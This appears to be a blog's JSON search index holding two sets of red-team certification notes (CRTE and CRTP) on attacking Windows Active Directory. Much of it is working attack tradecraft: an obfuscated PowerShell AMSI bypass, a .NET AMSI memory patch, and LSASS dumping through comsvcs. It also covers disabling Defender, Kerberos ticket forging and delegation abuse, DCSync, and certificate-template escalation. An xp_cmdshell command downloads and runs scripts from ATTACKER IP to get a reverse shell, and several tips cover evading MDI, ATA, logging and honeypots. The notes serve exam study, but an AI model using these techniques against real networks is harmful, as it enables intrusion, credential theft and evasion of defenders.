[
    {
      "title"    : "CRTE Notes",
      "category" : "",
      "tags"     : "Active Directory, AD, Notes, Red Team, Certification",
      "url"      : "/2023/06/12/CRTE-Notes",
      "date"     : "Jun 12, 2023",
      "content"  : " CRTE Notes These notes are a continuation of CRTP Certified Red Team Professional Notes https 0xd4y com 2023 04 05 CRTP-Notes Table of Contents This course is made for assumed breach scenarios Untitled CRTE 20Notes 20d90ebe33f6774189b29f11b6f3b0175b Untitled png PowerShell Bypasses InvisiShell - InvisiShell bypasses system-wide transcription PowerShell AMSI and script-block logging - use RunWithRegistryNonAdmin bat instead of RunWithPathAsAdmin bat - modifies HKCU which is less detected than HKLM - RunWithPathAsAdmin bat modifies HKLM - heavy detection on HKLM-based keys - run exit command when you are done to clean up AV Signature Bypass - use AMSITrigger https github com RythmStick AMSITrigger to identify what in your script is triggering AMSI - AmsiTrigger x64 exe -i C PATH TO script ps1 - use DefenderCheck https github com matterpreter DefenderCheck to identify what is triggering Defender - DefenderCheck exe C PATH TO script ps1 - use Invoke-Obfuscation https github com danielbohannon Invoke-Obfuscation for obfuscating scripts - minimize obfuscation and focus more on signature detection modifying detected malicious code string manipulation etc - the more a binary is obfuscated the more suspicious it looks Azure AD Can be integrated with on-prem AD using AD connect using one of the methods 1 Password Hash Sync PHS - all creds of on-prem is hashed and synced with Azure AD 2 Pass-Through Authentication PTA - Azure AD forwards creds to on-prem AD - on-prem checks if cred is valid or not this result is returned to Azure AD and Azure AD either allows user to access Azure resources or not 3 Federation - SAML based auth worklow - contains high-privileged account called MSOL RANDOM ID that performs a DCSync every two minutes - creds for this account stored in clear-text Attacking PHS - will not get detected by MDI if you DCSync using the MSOL user as this user is typically on the exclusion list of MDI due to its frequent DCSync Get User and Extract Creds powershell PowerView Get-DomainUser -Identity MSOL -Domain 0xd4y local AD Module Get-ADUser -Filter samAccountName -like MSOL -Server 0xd4y local -Properties select SamAccountName Description fl Source ADConnect PS Script adconnect ps1 Extract creds of MSOL ID user ADConnect Run CMD instance as MSOL ID user runas user 0xd4y local MSOL ID netonly cmd - note adconnect ps1 runs powershell exe so verbose logs are present - ensure to modify this script s code and run within Invisi-Shell to potentially bypass these logs Enumeration General - recommended to use AD PowerShell Module - signed by MS and therefore works in CLM - less suspicious - can use SharpView PowerView written in C - cannot use pipes Command Description --- --- Get-DomainPolicyData systemaccess Use to get policy for tickets Get-DomainGPOComputerLocalGroupMapping Get users that are in a local group for specified machine use -Identity to specify machine Get-DomainObjectACL -ResolveGUIDs Enumerate ACL for specific object Get-ADGroup -Filter -searchbase OU Mgmt DC us DC techcorp DC local -Properties Get members in group in a specific OU net view some server local Enumerate shares on some server Get-ADForest Domains Get-ADDomain -Server select name domainsid Get SID of all child forests and root forest in current forest Get-DnsServerZone -ZoneName some forest local fl Get IP addresses of DCs in target note you can also ping the DCs to find the IP if you already know the DC names env UserDNSDomain Get current forest name - ensure that you do not breach ticket policies when forging modifying a ticket for persistence AppLocker WDAC and Tamper Protection - can enumerate AppLocker rules with Get-AppLockerPolicy -Effective select -ExpandProperty RuleCollections - can enumerate WDAC with Get-CimInstance -ClassName Win32 DeviceGuard -Namespace root Microsoft Windows DeviceGuard - check tamper protection with Get-MpComputerStatus select IsTamperProtected - note tamper protection is on by default on Windows Server 2019 2022 and 1803 or later among other servers Misc - use Get-ADTrust -Filter intraForest -ne True -Server Get-ADForest Name to map all trusts of current forest - use Get-ADForest Domains Get-ADTrust -Filter intraForest -ne True -and ForestTransitive -ne True -Server to map all external trusts - can be done also with PowerView s Get-ForestDomain -Verbose Get-DomainTrust TrustAttributes -eq FILTER SIDS Domain Privilege Escalation LAPS Provides centralized storage of local user passwords and periodically rotates passwords Helps mitigate lateral movement by stopping reuse of passwords - check if ms-mcs-admpwd attribute is visible with Get-DomainComputer Select-Object dnshostname ms-mcs-admpwd Where-Object ms-mcs-admpwd -ne null - can also use Get-DomainOU Get-DomainObjectAcl -ResolveGUIDs Where-Object ObjectAceType -like ms-Mcs-AdmPwd -and ActiveDirect oryRights -match ReadProperty ForEach-Object Add-Member NoteProperty IdentityName Convert-SidToName SecurityIdentifier from PowerView to find OUs where LAPS is in use - use ADModule s Get-ADComputer -Identity 0xd4y machine -Properties ms-mcs-admpwd select -ExpandProperty ms-mcs-admpwd or PowerView s Get-DomainObject -Identity 0xd4y machine select -ExpandProperty ms-mcs-admpwd to get clear-text password of ms-mcs-admpwd attribute With the creds you can then do powershell winrs -r 0xd4y-machine -u Administrator -p ubscr1beTo0xd4y hostname net use x 0xd4y-machine C Users Public user notes Administrator ubscr1beTo0xd4y Then copy the files you need e g NetLoader perform port-forwarding and load whatever you want gMSA - provides password management password rotation every 30 days and management of SPNs and delegated administration for service accounts - helps protect against Kerberoast attacks - can potentially read the gMSA password from the msds-ManagedPassword attribute stored in binary form of MSDS-MANAGEDPASSWORD BLOB - must be explicitly allowed to do so not even Domain Admins can read this by default Command Description --- --- Get-ADServiceAccount -Filter Get all gMSA accounts denoted with the object class msDS-GroupManagedServiceAccount Get-ADServiceAccount -Identity gmsa account 0xd4y -Properties select PrincipalsAllowedToRetrieveManagedPassword Get users that can read the msds-ManagedPassword attribute Converting gMSA Password to NTLM Hash powershell PasswordBlob Get-ADServiceAccount -Identity 0xd4y -Properties msDS-ManagedPassword msDS-ManagedPassword Import-Module C PATH TO DSInternals psd1 decodedpwd ConvertFrom-ADManagedPasswordBlob PasswordBlob ConvertTo-NTHash -Password decodedpwd SecureCurrentPassword Golden gMSA - an attack in which gMSA is calculated offline using the KDS root key object - only DAs EAs and SYSTEM can retrieve KDS root key Constrained Delegation - Kerberos Only S4U2Self does not work because it does not have TRUSTED TO AUTH FOR DELEGATION configured - leverage resource-based constrained delegation RBCD 1 Create new machine account 2 Configured RBCD on machine 3 Get TGS for machine using new machine account 4 Request forwardable TGS using the previous TGS Getting access to target machine from original machine powershell Get machines with constrained delegation Get-ADObject -Filter msDS-AllowedToDelegateTo -ne null -Properties msDS-AllowedToDelegateTo Create new machine accouunt use Powermad ps1 New-MachineAccount -MachineAccount new machine account Inject original machine account TGT in session Rubeus exe asktgt user machine account aes256 MACHINE ACCOUNT AES256 KEY impersonateuser Administrator domain notes 0xd4y local ptt nowrap Configure TRUST TO AUTH FOR DELEGATION Set-ADComputer -Identity original machine account -PrincipalsAllowedToDelegateToAccount new machine account Convert password of new machine account to NTLM hash Rubeus exe hash password new machine account pass Get TGS for service Rubeus exe s4u impersonateuser Administrator user new machine account rc4 NTLM HASH msdsspn cifs original machine notes 0xd4y local nowrap Inject TGS in current session Rubeus exe s4u tgs TGS user original machine account aes256 MACHINE ACCOUNT AES256 KEY msdsspn cifs target machine notes 0xd4y local altservice http nowrap ptt - use winrs instead of PSRemoting to evade certain logging winrs -remote 0xd4y server -u notes 0xd4y -p Pl3as3Subscr1b3 COMMAND - can evade system-wide transcripts and deep script block logging With credentials execute commands on remote machine like this powershell creds Get-Credential Invoke-Command -Credential creds -ScriptBlock whoami -Computer 0xd4y machine - use opassth with SafetyKatz instead of pth and aes256 instead of ntlm to prevent detections by MDI - starts PowerShell session with logon type 9 just like runas netonly - note opassth is just the command specific to the modified Mimikatz version in the CRTE lab modified version of pth GenericWrite on Computer - with GenericWrite or GenericAll on a computer you can enable constrained delegation to laterally move Enabling Constrained Delegation powershell Enabled resource-based constrained delegation on target machine Set-ADComputer -Identity target machine -PrincipalsAllowedToDelegateToAccount owned machine account Get hash of owned machine account SafetyKatz sekurlsa ekeys Get TGS for HTTP service by impersonating Admin Rubeus exe s4u user owned machine account aes256 owned machine account hash msdsspn http target machine impersonateuser Administrator ptt Shadow Credentials - leverages msDS-KeyCredentialLink attribute to authenticate as another user or computer account - attribute used when Windows Hello for Business WHfB is configured - msDS-KeyCredentialsLink attribute contains raw public keys of certificate and will still work even if the credentials of the user or computer account are modified - only Key Admins and Enterprise Key Admins or users with GenericAll or GenericWrite are allowed to modify the msDS-KeyCredentialsLink attribute on a target user To abuse Shadow Credentials 1 AD CS should be configured or a Key Trust should be present 2 PKINIT should be supported 3 At least one DC with Windows Server 2016 or above 4 Need GenericWrite or GenericAll permissions on target object Adding Shadow Credentials powershell Add Shadow Credential on target object Whisker exe add target 0xd4y target user Check if msDS-KeyCredentialsLink attribute present on target use Get-DomainComputer in case of a computer account Get-DomainUser -Identity 0xd4y target user Certificate Service - certificate can be used for authentication encryption signing etc - check for certificates stored in local machine with ls cert LocalMachine My and then export it with ls cert LocalMachine My THUMBPRINT Export-PfxCertificate -FilePath C PATH TO SAVE cert pfx -Password ConvertTo-SecureString -String SubscribeTo0xd4y -Force -AsPlainText - then request TGT using Rubeus exe asktgt user pawadmin certificate cert pfx password SubscribeTo0xd4y nowrap ptt AD CS can be abused to 1 Extract user and machine certificates 2 Retrieve NTLM hashes 3 User and machine level persistence 4 Escalation to DA and EA 5 Domain persistence Untitled CRTE 20Notes 20d90ebe33f6774189b29f11b6f3b0175b Untitled 201 png - can use certify exe to find misconfigured templates certify exe find - note that the vulnerable flag only shows certificates in which domain users or default users group has enrollment rights Common misconfigurations 1 CA or target templates gives low-privileged user enrollment rights 2 Manager approval is disabled 3 Authorization signatures not required Escalating to DA from CERT powershell Get information for certs with msPKI-Certificates-Name-Flag set to ENROLLEE SUPPLIES SUBJECT Certify exe find enrolleeSuppliesSubject Request cert save text between BEGIN RSA PRIVATE KEY and END CERTIFICATE to a file e g cert pem Certify exe request ca CA NAME template CERT TEMPLATE altname Administrator Convert to pfx and name password as Follow0xd4y openssl exe pkcs12 -in cert pem -keyex -CSP Microsoft Enhanced Cryptographic Provider v1 0 -export -out admin pfx Request TGT Rubeus exe asktgt user Administrator certificate admin pfx password Follow0xd4y nowrap ptt Misc - may be able to add yourself to a group with Add-ADGroupMember -Identity MachineAdmins -Members 0xd4y File transferring with creds powershell Create shared folder between target machine notes-0xd4y and local machine net use x notes-0xd4y C Users Public user Administrator Pl34s3Subscr1be Copy files to target machine echo F xcopy C PATH TO Loader exe x Loader exe echo F xcopy C PATH TO SafetyKatz exe x SafetyKatz exe Delete shared folder net use x d - check if you have local admin access on another machine with Find-PSRemotingLocalAdminAccess - can spawn new instance with compromised creds using Rubeus Rubeus exe asktgt domain notes 0xd4y local user 0xd4y aes256 AES256 KEY opsec createnetonly C Windows System32 cmd exe show ptt Lateral Movement Using PSRemoting powershell passwd ConvertTo-SecureString Follow0xd4y -AsPlainText -Force creds New-Object System Management Automation PSCredential notes 0xd4y passwd session New-PSSession -ComputerName some machine -Credential creds Cross-Forest Attacks and Privescs Kerberoast It is possible to perform kerberoast attacks across forest trusts powershell PowerView Get-DomainTrust TrustAttributes -eq FILTER SIDS Get-DomainUser -SPN -Domain TargetName AD Module Get-ADTrust -Filter IntraForest -ne true Get-ADUser -Filter ServicePrincpalName -ne null -Properties ServicePrincipalName -Server Name Get TGS of target user using only PS Add-Type -AssemblyName System IdentityModel New-Object System IdentityModel Tokens KerberosRequestorSecurityToken -ArgumentList some svc eu-file eu local eu local tasklist exe FI IMAGENAME eq lsass exe rundll32 exe C windows system32 comsvcs dll MiniDump LSASS PID C PATH TO SAVE lsass dmp full Can also just do rundll32 exe C windows system32 comsvcs dll MiniDump Get-Process lsass id C PATH TO SAVE lsass dmp full Constrained Delegation Can abuse constrained delegation across forests if you already have a foothold across a forest trust powershell PowerView Get-DomainUser -TrustedToAuth -Domain target forest local Get-DomainComputer -TrustedToAuth -Domain target forest local AD Module Get-ADObject -Filter msDS-AllowedToDelegateTo -ne null -Properties msDS-AllowedToDelegateTo -Server target forest local Get creds for compromised user and request ldap altservice Rubeus exe s4u user OWNED USER aes256 OWNED USER HASH impersonateuser administrator msdsspn CIFS some machine other forest local altservice LDAP domain other forest local dc some-dc other forest local ptt DCSync SharpKatz exe --Command dcsync --user other forest krbtgt --Domain other forest local --DomainController some-dc other forest local - note that use of AES256 may not work across forests as it depends on whether or not AES encryption is supported Untitled CRTE 20Notes 20d90ebe33f6774189b29f11b6f3b0175b Untitled 202 png Unconstrained Delegation - TGT delegation must be enabled across trust disabled by default - check this with netdom trust trustingforest domain other forest local EnableTgtDelegation - note this can also be checked with Get-ADTrust -server other forest local -Filter although it could output false negatives and is less reliable in older versions ensure you are using the right version of the AD Module which fixes this bug Trust Key - SID Filtering occurs between forests so that one forest cannot request any resource as an EA or DA for another forest - to access resources in trusting domain SID filtering must be deactivated - all RIDs between and including 500 and 1000 are stripped check CRTP notes for more in-depth - with enablesidhistory yes you can attempt to access resources accessible to the specified RID as long as RID 1000 - if Get-ADTrust -Filter shows that the SIDFilteringForestAware attribute is True then SIDHistory filtering is enabled across the forest trust Getting Access to Other Groups powershell Get groups in other forest local with RID 1000 Get-ADGroup -Filter SID -ge S-1-5-21- ID -1000 -Server other forest local Forge inter-realm TGT using group BetterSafetyKatz exe kerberos golden user Administrator domain 0xd4y local sid S-1-5-21- ID rc4 TRUST TICKET HASH service krbtgt target other forest local sids S-1-5-21- ID - RID ticket C PATH TO SAVE output kirbi exit Get TGS for service Rubeus exe asktgs ticket C PATH TO output kirbi service HTTP some machine other forest local dc some-dc other forest local ptt Foreign Security Principal FSP - allows external forests trust or special identities e g Authenticated Users Enterprise DCs etc to be added to domain local security groups for example Authenticated Users - can be enumerated with PowerView s Find-ForeignGroup or Find-ForeignUser or with AD Module s Get-ADObject -Filter objectClass -eq foreignSecurityPrincipal - then enumerate the group with Get-ADGroup -Filter -Properties Member -Server other forest local Member -match SID - can also do Get-DomainUser -Domain other forest local ObjectSid -eq SID to find user with particular SID ACLs - ACLs may grant certain principals to access resources or have GenericAll or GenercWrite on identities cross-forest principals added to these ACLs are not displayed in the ForeignSecurityPrincipals container - only principals in a domain local security group are in the ForeignSecurityPrincipals container - with GenericAll you can reset a user s password with Set-DomainUserPassword -Identity 0xd4y -AccountPassword ConvertTo-SecureString Follow0xd4y -AsPlainText -Force -Domain other domain local PAM Trust - usually enabled between Bastion or Red Forest and prod user forest - allows high-privileged access to prod forest without needing credentials from a bastion forest - requires the creation of Shadow Principals in bastion domain that are mapped to DA or EA in prod forest powershell Get-ADTrust -Filter Get-ADObject -Filter objectClass -eq foreignSecurityPrincipal -Server bastion local Enumerate if PAM trust exists bastiondc New-PSSession bastion-dc bastion local Invoke-Command -ScriptBlock Get-ADTruzst -Filter ForestTransitive -eq True -and SIDFilteringQuarantined -eq False -Session bastiondc Check members of Shadow Principals Invoke-Command -ScriptBlock Get-ADObject -SearchBase CN Shadow Principal Configuration CN Services Get-ADRootDSE configurationNamingContext -Filter -Properties select Name member msDS-ShadowPrincipalSid fl -Session bastiondc Configure WSMan to allow PSRemoting via IP Address Set-Item WSMan localhost Client TrustedHosts -Force PSRemote into prod forest Enter-PSSession PROD FOREST IP ADDRESS -Authentication NegotiateWithImplicitCredential - note when PSRemoting using an IP address you must use NTLM authentication - you can then use Copy-Item -Path C Windows System32 lsass exe -FromSession prodsession -Destination C Users Administrator lsass exe to copy the lsass exe file on the remote session to the local machine MSSQL Use Invoke-SQLAudit to find misconfigurations in SQL server Getting Shell on SQL Instance - run this command from PowerUpSQL to get a reverse shell on target machine Get-SQLServerLinkCrawl -Instance us-mssql -Query exec master xp cmdshell powershell exe -c iex iwr -UseBasicParsing ATACKER IP amsibypass txt iex iwr -UseBasicParsing ATACKER IP sbloggingbypass txt iex iwr -UseBasicParsing ATACKER IP reverse ps1 select -ExpandProperty CustomQuery - this requires rpcout and xp cmdshell to be enabled on the SQL machine - can manually enabled rpcout and xp cmdshell on a SQL node as long as the user on which the target node is run is high-privileged such as sa system administrator - use Get-SQLInstanceDomain Get-SQLServerInfo to get information for SQL instances in current forest Enable RPC on SQL machine powershell Invoke-SqlCmd -Query exec sp serveroption server target-sqlsrv optname rpc optvalue TRUE Invoke-SqlCmd -Query exec sp serveroption server target-sqlsrv optname rpc out optvalue TRUE Invoke-SqlCmd -Query EXECUTE sp configure show advanced options 1 reconfigure AT target-sqlsrv Invoke-SqlCmd -Query EXECUTE sp configure xp cmdshell 1 reconfigure AT target-sqlsrv User Impersonation May be possible to impersonate other users within an SQL instance if given the IMPERSONATE privilege and EXECUTE AS function - to find users you can impersonate run Get-SQLquery -Instance target-sqlsrv -Query SELECT distinct b name http b name FROM sys server permissions a INNER JOIN sys server principals b ON a grantor principal id b principal id WHERE a permission name IMPERSONATE - use SQLRecon exe for impersonation as they have modules meant exactly for such a scenario Performing Impersonation with SQLRecon powershell Enabling advanced options SQLRecon exe -a Windows -s target-sqlsrv -m iquery -i sa -o EXEC sp configure show advanced options 1 RECONFIGURE Enabling xp cmdshell SQLRecon exe -a Windows -s target-sqlsrv -m iquery -i sa -o EXEC sp configure xp cmdshell 1 RECONFIGURE Running whoami on target SQLRecon exe -a Windows -s target-sqlsrv -m iquery -i sa -o EXEC master xp cmdshell whoami - note that you can also use PowerView s Get-SQLquery -Instance target-sqlsrv -Query EXECUTE AS LOGIN sa EXEC master xp cmdshell whoami Offensive NET Pros Cons --- --- System Management Automation dll lacks some security features for NET applications binaries Potentially detected by AV EDR Harder to deliver payload need additional script for loading it into memory New process creation can be detected by blue team - use NetLoader https github com Flangvik NetLoader to deliver binary payloads and execute it directly in memory while bypassing AMSI ETW by patching them - use port forwarding to indirectly load the binary from a remote address check https 0xd4y com 2023 04 05 CRTP-Notes https 0xd4y com 2023 04 05 CRTP-Notes to see how to do that - NetLoading an unsigned binary such as SafetyKatz may not work if WDAC is enabled which would result in an error such as The system cannot execute the specified program check with Get-CimInstance -ClassName Win32 DeviceGuard -Namespace root Microsoft Windows DeviceGuard - use rundll32 exe to dump the LSASS process and then exfiltrate it detected by Defender so make sure to turn it off with Set-MpPreference -DisableRealTimeMonitoring true powershell Get lsass PID tasklist FI IMAGENAME eq lsass exe Suppose the lsass pid is 716 rundll32 exe C windows system32 comsvcs dll MiniDump 716 C PATH TO SAVE lsass dmp full Copy lsass dmp to current machine echo F xcopy target machine C PATH TO lsass dmp C PATH TO SAVE lsass dmp Dump creds from lsass dmp sekurlsa minidump C PATH TO lsass dmp sekurlsa ekeys Best Practices - set Account is sensitive and cannot be delegated for sensitive accounts - never run services with DA privileges Privileged Administrative Workstation PAWs - workstation for performing sensitive tasks - provides protection against attacks such as phishing OS vulnerabilities and credential replay attacks Just Enough Administration JEA - role-based access control for PS remote delegation administration - restricts non-admin users to remotely connect to machine for specific administrative tasks - can control command user runs and parameters - PS transcription and logging is enabled on JEA endpoints Tools 1 BloodHound https github com BloodHoundAD BloodHound - useful for enumeration in penetration tests finding exploitation pathways 2 PowerSploit https github com PowerShellMafia PowerSploit - PowerView and PowerUp - useful for enumeration and finding exploiting privesc pathways 3 ADModule https github com samratashok ADModule - enumeration - signed by Microsoft 4 PowerUpSQL https github com NetSPI PowerUpSQL - toolkit for attacking SQL servers 5 PowerShdll https github com p3nt4 PowerShdll nopowershell https github com bitsadmin nopowershell and Invisi-Shell https github com OmerYa Invisi-Shell - useful for bypassing some PowerShell defenses logging and staying stealthy 6 NetLoader https github com Flangvik NetLoader - used for loading executables from memory while bypassing EDR solutions 7 SpoolSample https github com leechristensen SpoolSample - contains binary MS-RPRN exe used for abusing print spooler bug 8 Certify https github com GhostPack Certify - AD CS exploitation 9 Rubeus https github com GhostPack Rubeus - Kerberos abuse 10 SQLRecon https github com skahwah SQLRecon - SQL impersonation and exploiting SQL misconfigurations 11 Ligolo-ng https github com nicocha30 ligolo-ng - Tunneling pivoting References 1 CRTE Course - main source 2 https learn microsoft com en-us microsoft-365 security defender-endpoint prevent-changes-to-security-settings-with-tamper-protection view o365-worldwide https learn microsoft com en-us microsoft-365 security defender-endpoint prevent-changes-to-security-settings-with-tamper-protection view o365-worldwide - tamper protection 3 https www netspi com blog technical network-penetration-testing hacking-sql-server-stored-procedures-part-2-user-impersonation https www netspi com blog technical network-penetration-testing hacking-sql-server-stored-procedures-part-2-user-impersonation - SQL impersonation - Exploiting SQL server misconfigurations ",
				"image": "/images/CRTE.jpeg"
		},
  
    {
      "title"    : "CRTP Notes",
      "category" : "",
      "tags"     : "Active Directory, AD, Notes, Red Team, Certification",
      "url"      : "/2023/04/05/CRTP-Notes",
      "date"     : "Apr 05, 2023",
      "content"  : " CRTP Notes Contact LinkedIn https www linkedin com in segev-eliezer https www linkedin com in segev-eliezer YouTube https YouTube com 0xd4y https YouTube com 0xd4y Website https 0xd4y com https 0xd4y com GitHub https GitHub com 0xd4y https GitHub com 0xd4y Table of Contents Module - ADModule https github com samratashok ADModule can be used even in ConstrainedLanguage mode because it is signed by Microsoft - also makes detection harder - PowerView https github com PowerShellMafia PowerSploit - great for enumeration - used by pentesters and red teamers not stealthy - not signed by Microsoft Enumeration Domain Policies Kerberos Command Description --- --- Get-DomainPolicy Kerberos Policy Returns MaxTicketAge MaxServiceAge MaxClockSkew etc Get-ADDomainController Get domain controllers for current domain Get-NetDomainController -Domain DOMAIN NAME Get domain controllers for another domain Get-ADUser -Filter -Properties Get all users in domain Get-UserProperty -Properties pwdlastset Check when password was last set for domain users Get-ADDomain Get current domain Get-DomainPolicyData Get password policy kerberos policy etc - the kerberos policy shows MaxTicketAge max age of TGT in hours MaxRenewAge time period in days for which TGT can be renewed and MaxServiceAge max age of TGS in hours - you cannot list local users on a remote machine without having local admin privileges on that machine - the DC is the only exception to this How Kerberos Works Untitled CRTP 20Notes 207c65562269c14f0ba54f9df255f72aa4 Untitled png - Kerberos NTLM uses RC4 encryption https learn microsoft com en-us openspecs windows protocols ms-nlmp 1e846608-4c5f-41f4-8454-1b91af8a755b - DC contains all the credentials in the domain which allows it to decrypt requests made with a user s NTLM hash - in first step user encrypts timestamp with his or her NTLM hash - DC then checks the clock skew between the user s timestamp and the DC timestamp skew should not be more than 5 minutes by default - TGT is encrypted and signed with NTLM hash of krbtgt - krbtgt account made specifically for this purpose - user requests TGS from DC when trying to access some resource e g application server - note the TGS is encrypted with the NTLM hash of the requested service s service account - requested service can decrypt the TGS as the service knows its own NTLM hash - when DC decrypts TGT the only validation it performs is whether or not it can decrypt the TGT and does not validate the decrypted contents - optional mutual authentication can occur to ensure client doesn t send TGS to rogue app - optional PAC requests are not enabled by default to avoid bogging down the DC with requests - Kerberos policy checked only when TGT is created - user account validated by DC when TGT age is greater than 20 minutes User Fields - get user s description fields sometimes contain passwords in cleartext powershell Get-ADUser -Filter Description -like built -Properties Description select name Description Identities Command Description --- --- Get-ADComputer -Filter Returns computers connected to current domain Get-ADGroup -Filter Returns all groups in current domain Get-ADGroupMember -Identity GROUP NAME -Recursive Returns users part of specified group Get-ADPrincipalGroupMembership -Identity USER See groups user is a member of Get-DomainGroup -Username 0xd4y Find which group 0xd4y is a part of Invoke-ACLScanner -ResolveGUIDs IdentityReferenceName -match GROUP NAME OR USER NAME Find permissions identity has for users in domain - can also use Find-InterestingDomainAcl -ResolveGUIDs IdentityReferenceName -match GROUP NAME OR USER NAME instead of Invoke-ACLScanner Shares Command Description --- --- Invoke-ShareFinder Shows available shares on network Invoke-FileFinder Find sensitive files on computers in domain Get-NetFileServer Get all file servers of domain - note that output returned from Invoke-ShareFinder doesn t necessarily mean you can access the shares but high chance that you can Finding Privesc Pathways BloodHound - do not use BloodHound in red team engagements very noisy - use PowerView and PowerUp instead - Invoke-BloodHound -CollectionMethod All - maps out entire domain Relationships Trust Relationships - allows user of a domain or forest to access resources in another domain or forest - implicit two-way trust exists between domains - note that forest trusts are never implicit - trust relationships need to be created between forests One-Way Trust - users in trusted domain can access resources in another domain but not the reverse Untitled CRTP 20Notes 207c65562269c14f0ba54f9df255f72aa4 Untitled 201 png Two-Way Trust - users in both domains can access each other s resources Untitled CRTP 20Notes 207c65562269c14f0ba54f9df255f72aa4 Untitled 202 png Transitive Trust - relationships that are extended with other domains - default intra-forest trust relationships are transitive two-way trusts - parent-child - tree-root Untitled CRTP 20Notes 207c65562269c14f0ba54f9df255f72aa4 Untitled 203 png - domains A and C have a two-way trust with each other because they both have a two-way trust with domain B Nontransitive Trust - cannot be extended to other domains or forests - can be one-way or two-way - default trust between domains in different forests when the forests don t have a trust relationship aka external trust Trust Types Domain Trusts Parent-Child Trust - created automatically between new domain and existing domain - e g PleaseFollow 0xd4y com http PleaseFollow 0xd4y com is a child of 0xd4y com - always two-way transitive - can be found with Get-ADTrust -Filter Forest Trusts - established between root domains of forests - can be one-way two-way transitive or nontransitive - needs to be manually created forests trusts do not exist by default Untitled CRTP 20Notes 207c65562269c14f0ba54f9df255f72aa4 Untitled 204 png - can be found with Get-ADForest Avoiding Detection - ensure that you bypass system-wide transcription script block logging and then AMSI in that order to minimize IOCs - can be bypassed with https github com OmerYa Invisi-Shell https github com OmerYa Invisi-Shell PowerShell AMSI Bypass One-liner to bypass PowerShell AMSI This script contains malicious content block powershell S eT-It em V aR IA blE 1 q2 uZ x TYpE 1 0 -F F rE Get-varI A BLE 1Q 2U zX -VaL A ss Embly GET TY Pe 6 3 1 4 2 0 5 -f Uti l A Am si Man age men t u to mation s Syst em g etf iElD 0 2 1 -f a msi d I nitF aile 2 4 0 1 3 -f S tat i Non Publ i c c sE T VaLUE n ULl t RuE NET AMSI Bypass powershell ZQCUW using System using System Runtime InteropServices public class ZQCUW DllImport kernel32 public static extern IntPtr GetProcAddress IntPtr hModule string procName DllImport kernel32 public static extern IntPtr LoadLibrary string name DllImport kernel32 public static extern bool VirtualProtect IntPtr lpAddress UIntPtr dwSize uint flNewProtect out uint lpflOldProtect Add-Type ZQCUW BBWHVWQ ZQCUW LoadLibrary SYstem Net wEBUtIlITy HTmldecoDE 97 109 115 105 46 100 108 108 XPYMWR ZQCUW GetProcAddress BBWHVWQ systeM neT webUtility HtMldECoDE 65 109 115 105 83 99 97 110 66 117 102 102 101 114 p 0 ZQCUW VirtualProtect XPYMWR uint32 5 0x40 ref p TLML 0xB8 PURX 0x57 YNWL 0x00 RTGX 0x07 XVON 0x80 WRUD 0xC3 KTMJX Byte TLML PURX YNWL RTGX XVON WRUD System Runtime InteropServices Marshal Copy KTMJX 0 XPYMWR 6 Bypassing AV Signatures - use AMSITrigger https github com RythmStick AMSITrigger for identifying what part of a script is being detected - use DefenderCheck https github com matterpreter DefenderCheck to see what in the code is detected by Defender Running SafetyKatz 1 Downloaded latest Mimikatz version and Out-CompressedDLL ps1 https github com PowerShellMafia PowerSploit blob master ScriptModification Out-CompressedDll ps1 2 Run Out-CompressedDll mimikatz exe out txt 3 Replace compressedMimikatzString value with contents of out txt Untitled CRTP 20Notes 207c65562269c14f0ba54f9df255f72aa4 Untitled 205 png 4 Change byte size Untitled CRTP 20Notes 207c65562269c14f0ba54f9df255f72aa4 Untitled 206 png NetLoader - used for loading binary from filepath or URL - patches AMSI and ETW before running payload - runs payloads from memory - DO NOT load a remote binary directly through a URL path that you own rather use port forwarding to load a binary remotely by using the loopback address as a proxy - otherwise this triggers Defender s behavior-based detection executable downloaded from remote web server powershell First configure a port for port forwarding null winrs -r follow-0xd4y netsh interface portproxy add v4tov4 listenport 8080 listenaddress 0 0 0 0 connectport 80 connectadddress ATTACKER IP Then load the remote binary using NetLoader null winrs -r follow-0xd4y C PATH TO Loader exe -path http 127 0 0 1 8080 SafetyKatz exe sekurlsa ekeys exit - make sure to put NetLoader on target disk prior to running the aforementioned commands with echo F xcopy C PATH TO Loader exe follow-0xd4y C PATH TO SAVE Loader exe Other - with local admin access run Set-MpPreference -DisableRealtimeMonitoring true to temporarily disable Defender - note that it is more silent and preferred to use Set-MpPreference -DisableIOAVProtection true as this will specifically only target AV - disabling defender through command line does not work for Windows 10 and 11 Windows Server 2022 Windows Server 2019 and Windows Server version 1803 or later - avoid communicating with the DC as much as possible ATA - avoid running Invoke-UserHunter against DCs to prevent logs e g Reconnaissance using SMB session enumeration - skip running against DCs with -ComputerFile computers txt where DCs are not in the computers txt file - triggers 4624 Account Logon 4634 Account Logoff and in case of success also triggers 4672 Admin Logon - for golden tickets and overpass-the-hash ensure to also add aes256 AES256 key and if possible also aes128 AES128 key to avoid ATA s Encryption downgrade activity finding - DCSync attacks trigger ATA s Malicious replication of Directory Services finding only possible to bypass if run from a domain controller or child domain controller - with DC NTLM hash use netsync to extract the hashes of machine accounts more opsec safe and may bypass MDI - avoid interacting with DAs as much as possible - NEVER use automated domain takeover tools extremely noisy Honeypots - by checking when a user s password was last set you can differentiate actual users from honeypot decoy users - compare potential decoy object with known actual object - compare SID of other users with built-in users e g built-in administrator RID 500 - you can find the legitimate DC with the logonserver environment variable - objects created by some deception solutions may be filtered out when using WMI for retrieving information - run Invoke-HoneypotBuster -OpSec to find potential honeypots - it s better to look for decoys manually but this is a good tool for finding obvious honeypots if logoncount 6 the user does not show up Signs Object is a Decoy 1 User has very enticing name 2 User s pwdlastset was last set a long time ago 3 User s badpwdcount is 0 - note badpwdcount is typically low for service accounts 4 User s logoncount is 0 or few 5 lastLogon or lastlogontimestamp was from a long time ago 6 objectSID is different than the domain s 7 whenCreated is default or very new or old Other - with local admin access run Set-MpPreference -DisableRealtimeMonitoring true to temporarily disable Defender - note that it is more silent and preferred to use Set-MpPreference -DisableIOAVProtection true as this will specifically only target AV - disabling defender through command line does not work for Windows 10 and 11 Windows Server 2022 Windows Server 2019 and Windows Server version 1803 or later - avoid communicating with the DC as much as possible - avoid running targeted LDAP queries MDI checks for potentially malicious queries - it is more opsec safe to request for as much as possible and then filter the output better chances of bypassing MDI Domain Privilege Escalation Keep your eyes on the goals of your operation and avoid getting DA privileges if it is not required This will greatly help in avoiding detection Session Hijack - if user has active session in workstation where you have local admin you can obtain their TGT even if they are a domain admin - can be found with Invoke-UserHunter -GroupName GROUP NAME - add the -CheckAccess parameter to check if you have local admin access - works by using Get-NetGroupMember and Get-NetSession - you can then extract the user s TGT with Invoke-Mimikatz Command sekurlsa tickets export ex - find which computers a DA has a session on with Find-DomainUserLocation 